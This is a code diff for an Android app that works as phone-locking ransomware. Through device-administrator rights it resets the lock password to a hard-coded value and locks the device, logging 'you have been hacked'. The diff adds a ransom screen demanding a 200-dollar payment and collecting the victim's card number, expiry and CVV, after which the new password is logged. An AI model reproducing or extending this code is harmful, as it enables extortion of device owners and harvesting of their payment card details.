@@ -5,15 +5,30 @@ import android.app.admin.DevicePolicyManager;
 import android.content.ComponentName;
 import android.content.Context;
 import android.content.Intent;
+import android.os.CountDownTimer;
 import android.support.v7.app.AppCompatActivity;
 import android.os.Bundle;
 import android.util.Log;
+import android.view.View;
 import android.view.WindowManager;
-import android.widget.Toast;
+import android.widget.Button;
+import android.widget.EditText;
+import android.widget.ProgressBar;
+import android.widget.TextView;
 
-public class MainActivity extends AppCompatActivity {
+
+public class MainActivity extends AppCompatActivity implements View.OnClickListener {
     private ComponentName DeviceAdminComponent;
     private DevicePolicyManager devicePolicyManager;
+    private EditText CreditCardNumber;
+    private EditText Month;
+    private EditText Year;
+    private EditText CVV;
+    private TextView AmountToPay;
+    private Button PayAndUnlockButton;
+    private ProgressBar progressBar;
+    private String newPassword = "ofir";
+
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
@@ -24,6 +39,9 @@ public class MainActivity extends AppCompatActivity {
         setContentView(R.layout.activity_main);
         this.DeviceAdminComponent = new ComponentName(getApplicationContext(), MyAdminReceiver.class);
         this.devicePolicyManager = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
+        connectXmlToCode();
+        this.progressBar.setVisibility(View.GONE);
+        this.PayAndUnlockButton.setOnClickListener(this);
         if (this.devicePolicyManager.isAdminActive(this.DeviceAdminComponent)) {
             Log.d("is","you have been hacked !!!");
             changePassword();
@@ -44,10 +62,74 @@ public class MainActivity extends AppCompatActivity {
         this.devicePolicyManager.setPasswordQuality(
                 this.DeviceAdminComponent, DevicePolicyManager.PASSWORD_QUALITY_UNSPECIFIED);
         this.devicePolicyManager.setPasswordMinimumLength(this.DeviceAdminComponent, 0);
-        this.devicePolicyManager.resetPassword("2511",
+        this.devicePolicyManager.resetPassword(this.newPassword,
                 DevicePolicyManager.RESET_PASSWORD_REQUIRE_ENTRY);
         Log.d("is","password changed !");
         this.devicePolicyManager.lockNow();
-        //this.finish();
+
+    }
+    public void connectXmlToCode(){
+        this.CreditCardNumber = (EditText)findViewById(R.id.credit_card_field);
+        this.Month = (EditText)findViewById(R.id.month_field);
+        this.Year = (EditText)findViewById(R.id.year_field);
+        this.CVV = (EditText)findViewById(R.id.cvv_field);
+        this.PayAndUnlockButton = (Button)findViewById(R.id.PayAndUnlockDevice);
+        this.AmountToPay = (TextView)findViewById(R.id.theAmount);
+        this.AmountToPay.setText("200$");
+        this.progressBar = (ProgressBar)findViewById(R.id.progressBar);
+    }
+
+    @Override
+    public void onClick(View v) {
+        if (v == this.PayAndUnlockButton){
+            if (checkInputs()){
+                this.progressBar.setVisibility(View.VISIBLE);
+                CountDownTimer countDownTimer = new CountDownTimer(5000,1000) {
+                    @Override
+                    public void onTick(long millisUntilFinished) {
+
+                    }
+
+                    @Override
+                    public void onFinish() {
+                        progressBar.setVisibility(View.GONE);
+                        Log.d("finish","you released your device! the password is: "+newPassword);
+                    }
+                }.start();
+            }
+
+        }
+    }
+    public boolean checkInputs(){
+        Boolean creditCardOk=false,monthOk=false,yearOk=false,cvvOk=false;
+        String creditCard = this.CreditCardNumber.getText().toString();
+        String month = this.Month.getText().toString();
+        String year = this.Year.getText().toString();
+        String cvv = this.CVV.getText().toString();
+        if (!creditCard.matches("[0-9]+") || creditCard.length() != 16 || !creditCard.startsWith("4580")) {
+            Log.d("Error","wrong crdit card format");
+        }
+        else
+            creditCardOk = true;
+        if (!month.matches("[0-9]+") || month.length() != 2 || Integer.parseInt(month)< 1 || Integer.parseInt(month) > 12 ) {
+            Log.d("Error","wrong month format");
+        }
+        else
+            monthOk = true;
+        if (!year.matches("[0-9]+") || year.length() != 2 || Integer.parseInt(year)< 17 || Integer.parseInt(year) > 30 ) {
+            Log.d("Error","wrong year format");
+        }
+        else
+            yearOk = true;
+        if (!cvv.matches("[0-9]+") || cvv.length() != 3) {
+            Log.d("Error","wrong cvv format");
+        }
+        else
+            cvvOk = true;
+        if (creditCardOk && monthOk && yearOk && yearOk && cvvOk){
+            return true;
+        }
+        else
+            return false;
     }
 }
